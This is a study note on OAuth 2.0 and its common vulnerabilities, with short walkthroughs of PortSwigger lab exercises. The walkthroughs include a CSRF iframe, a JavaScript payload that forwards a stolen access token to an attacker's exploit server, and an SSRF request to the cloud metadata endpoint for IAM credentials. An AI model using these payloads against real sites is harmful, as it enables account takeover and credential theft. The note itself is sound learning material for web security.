# OAuth
 OAuth 2.0 was developed to facilitate secure sharing of specific data between applications. It involves interactions between three key parties: a client application, a resource owner, and the OAuth service provider.

- **Client application** : The website or web application that wants to access the user's data. 
- **Resource owner** : The user whose data the client application wants to access. 
- **OAuth serveice provider** : The website or application that controls the user's data and access. It supports OAuth by providing an API for interacting with an authorization server and a resource server.

## OAuth process
OAuth can be implemented in various ways, referred to as OAuth "flows" or "grant types." The most common ones are the "authorization code" and "implicit" grant types. Both of these broadly follow similar stages :

1. The client application requests access to a subset of the user's data, specifying the grant type and type of access.
2. The user logs into the OAuth service and gives explicit consent for the requested access.
3. The client application receives an access token proving it has permission to access the data, with the process varying by grant type.
4. The client application uses the access token to make API calls and retrieve data from the resource server.

## OAuth grant types
The OAuth grant type defines the sequence of steps in the OAuth process and determines how the client application communicates with the OAuth service, including how the access token is sent. Grant types are often called **OAuth flows**.

The OAuth service must be configured to support a specific grant type before the client can initiate the flow. The client specifies the desired grant type in the initial authorization request.

There are multiple grant types, each with varying complexity and security. The most common are the **authorization code** and **implicit** grant types.

## OAuth authentication
OAuth authentication is implemented as follows:
1. The user opts to log in using their social media account, prompting the client application to use the social media site's OAuth service to request data like the user's email address.
2. After obtaining an access token, the client application retrieves this data from the resource server, often from a `/userinfo` endpoint.
3. Once the data is received, the client application uses it to log the user in, replacing a username. The access token often serves as a substitute for a traditional password.

### Recon
When using an external OAuth service, you can identify the specific provider by looking at the hostname to which the authorization request is sent. Since these services offer a public API, there is often detailed documentation available, providing useful information such as endpoint names and configuration options.  

Once you know the hostname of the authorization server, you should always try sending a `GET` request to the following standard endpoints: 

```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

#### Labs Portswigeer 
e.g.) The main request to play with is ```/auth?client_id=...```  
1. Authentication bypass via OAuth implicit flow
>Intercept the whole process of OAuth authentication and observe /authenticate POST request that contains email and username. Change these parameters to carlos'.

2. Forced OAuth profile linking
>Intercept the whole process of OAuth authentication and observe /oauth-linking request with code. This request is without state parameter, so Generate CSRF PoC and drop the request. Send it to victim and login via OAuth.
```
<iframe src="URL/oauth-linking"></iframe>
```

3. OAuth account hijacking via redirect_uri
>Intercept the whole process of OAuth authentication and observe `/auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx`, change redirect_uri to your exploit server and Generate CSRF PoC, drop the request. Send it to victim and find out his /oauth-callback?code.

4. Stealing OAuth access tokens via an open redirect
>4.1 Same as the previous one observe ```/auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx```.  
>4.2 On home page open any post and at the bottom observe "Next post" button. It is open redirect.  
>4.3 Write the next URL:  
```
redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/
```  
>This will redirect us to our exploit server and send us oauth code as fragment identifier, so we need to extract this value using JS.  
>4.4 Write final payload:  
```
<script>
    if (!document.location.hash) {
        window.location = "https://oauth-xxx.web-security-academy.net/auth?client_id=np1l4fiaizdo4d6r09enk&redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/&response_type=token&nonce=-2091701200&scope=openid%20profile%20email"
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

5. SSRF via OpenID dynamic client registration

This task involves exploiting an OAuth service by registering a fake client application and using the logo_uri property to make the OAuth server fetch sensitive metadata from an internal URL. Here's the step-by-step process:
>5.1 Log in to your account and access the OAuth server's configuration file at /.well-known/openid-configuration.  
>5.2 Register a new client application by sending a POST request to /reg. Include a redirect_uris array with an arbitrary URL.  
>5.3 Check the OAuth flow using Burp to see that the "Authorize" page fetches the client application's logo from a specific URL.  
>5.4 Modify the registration request to include a logo_uri property.Replace the logo_uri with a URL pointing to sensitive metadata (http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/).    
>5.5 Trigger the logo fetch request by sending a GET request to the logo's endpoint using the new client ID.  
>5.6 Fetch the logo again using the new client ID to retrieve sensitive information, such as the secret access key, from the OAuth provider's cloud environment.  
